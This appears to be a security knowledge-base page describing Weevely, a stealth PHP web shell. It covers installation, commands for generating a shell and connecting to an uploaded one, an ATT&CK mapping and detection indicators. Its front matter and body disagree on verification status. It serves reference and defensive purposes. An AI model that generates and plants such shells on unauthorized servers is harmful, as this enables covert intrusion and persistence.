---
id: 9e602e97-d8b0-4b97-8d5b-2a8678abc266
type: tool
verified: true
created_at: '2019-08-28T21:17:40.951553+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - macOS
  - Web
tags:
  - webshell
  - php
  - post-exploitation
  - stealth
url: 'https://github.com/epinna/weevely3'
commands:
  - '[[commands/weevely-generate-shell]]'
  - '[[commands/weevely-connect-to-shell]]'
validated: true
---

# weevely

**Status**: Unverified

## Overview

Weevely is a stealth PHP web shell designed for post-exploitation in web applications. It provides a command-line interface that simulates a telnet-like connection to the target server, allowing attackers to manage files, execute commands, interact with databases, and perform other post-exploitation tasks while maintaining obfuscation to evade detection.

## Description

Weevely generates obfuscated PHP agents that can be uploaded to compromised web servers. Once deployed, it enables remote access through encrypted sessions, supporting modules for tasks like privilege escalation, credential dumping, and lateral movement. It's particularly useful for maintaining persistence in web environments and managing legitimate or free-hosted web accounts without raising alarms.

## Features

- **Stealth Obfuscation**: Generates polyglot PHP shells that blend with legitimate code.
- **Modular Design**: Built-in modules for file operations, system commands, database access, network interactions, and more.
- **Encrypted Sessions**: All communications are encrypted to prevent eavesdropping.
- **Telnet-like Interface**: Interactive CLI for seamless command execution.
- **Cross-Platform**: Works on any server supporting PHP (Apache, Nginx, IIS).

## Installation

### Requirements

- PHP 5.3+ (for the agent)
- Python 2.7+ (for the client)
- Git

### Install Commands

```bash
# On Kali Linux (pre-installed in some versions)
sudo apt update && sudo apt install weevely

# Manual install from GitHub
sudo apt install python2.7 git
sudo git clone https://github.com/epinna/weevely3.git /opt/weevely3
cd /opt/weevely3
sudo python2.7 setup.py install

# For Ubuntu/Debian
echo 'deb http://http.kali.org/kali kali-rolling main contrib non-free' | sudo tee /etc/apt/sources.list.d/kali.list
wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -
sudo apt update && sudo apt install weevely
```

## Basic Usage

```bash
weevely --help
```

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message |
| `-v, --verbose` | Enable verbose output for debugging |
| `--proxy` | Use a proxy for connections |

## Examples

### Example 1: Basic Usage

Generate and connect to a shell:

```bash
# Generate shell
weevely generate mypass shell.php

# Connect (after uploading shell.php to target)
weevely http://target.com/shell.php mypass
```

### Example 2: Advanced Usage

Connect with proxy:

```bash
weevely --proxy http://127.0.0.1:8080 http://target.com/shell.php mypass
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Web Shell]] Web Shell
- [[JavaScript]] JavaScript (for client-side interactions)
- [[Web Protocols]] Web Protocols

### Tactics

- [[Execution]] Execution
- [[Command and Control]] Command and Control
- [[Persistence]] Persistence

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual PHP file uploads with obfuscated code (look for base64 or custom encoding).
- Outbound HTTP/HTTPS connections from web servers to attacker IPs on non-standard ports.
- Anomalous process spawning from web server processes (e.g., Apache spawning system commands).
- File integrity monitoring alerts on web directories.
- Network logs showing encrypted payloads in POST requests.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Burp-Suite]] (for initial web vuln discovery)
- [[tools/Metasploit]] (for broader exploitation frameworks)

## References

- Official GitHub: https://github.com/epinna/weevely3
- Documentation: https://github.com/epinna/weevely3/wiki
- Related: OWASP Web Shell Testing Guide
